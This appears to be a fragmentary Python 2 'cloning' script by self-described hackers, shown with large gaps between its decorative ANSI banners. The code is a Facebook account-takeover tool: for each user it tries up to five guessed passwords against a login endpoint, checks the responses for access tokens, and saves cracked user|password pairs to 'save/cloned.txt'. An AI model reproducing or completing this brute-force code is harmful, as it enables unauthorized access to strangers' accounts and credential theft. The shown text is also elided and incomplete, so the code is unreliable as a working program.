...
\033[0;95m╭════════════════════════════════════════════╮
\033[0;94m║\033[0;94mAUTHOR : \033[0;94m MR ZEEKO.                                
\033[0;94m║\033[0;93m FB :\033[0;94m "ZULFIQAR BALOCH"                                             
\033[0;94m╰════════════════════════════════════════════╯
...
\033[1;91m
\033[1;92m$$$$$$$$\ $$$$$$$$\ $$$$$$$$\ $$\   $$\  $$$$$$\  
\033[1;93m\____$$  |$$  _____|$$  _____|$$ | $$  |$$  __$$\ 
\033[1;94m    $$  / $$ |      $$ |      $$ |$$  / $$ /  $$ |
\033[1;93m   $$  /  $$$$$\    $$$$$\    $$$$$  /  $$ |  $$ |
 \033[1;94m $$  /   $$  __|   $$  __|   $$  $$<   $$ |  $$ |
 \033[1;93m$$  /    $$ |      $$ |      $$ |\$$\  $$ |  $$ |
\033[1;94m$$$$$$$$\ $$$$$$$$\ $$$$$$$$\ $$ | \$$\  $$$$$$  |
\033[1;95m\________|\________|\________|\__|  \__| \______/ 
...
\033[1;96m We are MR ZEEKO
\033[1;96mBALOCHISTAN HACKRES🖕
 
 
 
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mMR ZEEKO .                                   
\033[0;91m║\033[0;91m:\033[0;92m "I HEET FAK LOVRES"                                           
\033[0;95m╰════════════════════════════════════════════╯
...
logo2 = """
 ...
 \033[1;91m ____          _      ____   _____ _    _ 
\033[1;92m |  _ \   /\   | |    / __ \ / ____| |  | |
 \033[1;93m| |_) | /  \  | |   | |  | | |    | |__| |
 \033[1;94m|  _ < / /\ \ | |   | |  | | |    |  __  |
 \033[1;95m |_) / ____ \| |___| |__| | |____| |  | |
 \033[1;96m|____/_/    \_\______\____/ \_____|_|  |_|
...
def Zeek():
    ...
    time.sleep(0.10)
    print '\x1b[1;95m[2] ERRO NOT FOUND '
    time.sleep(0.10)
    print '\x1b[1;95m[3] NOT FOUND'
    time.sleep(0.10)
    print '\x1b[1;95m[4] CLONING ERROR'
    time.sleep(0.10)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;93m(CP)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(CP)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(CP)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(CP)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(CP)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
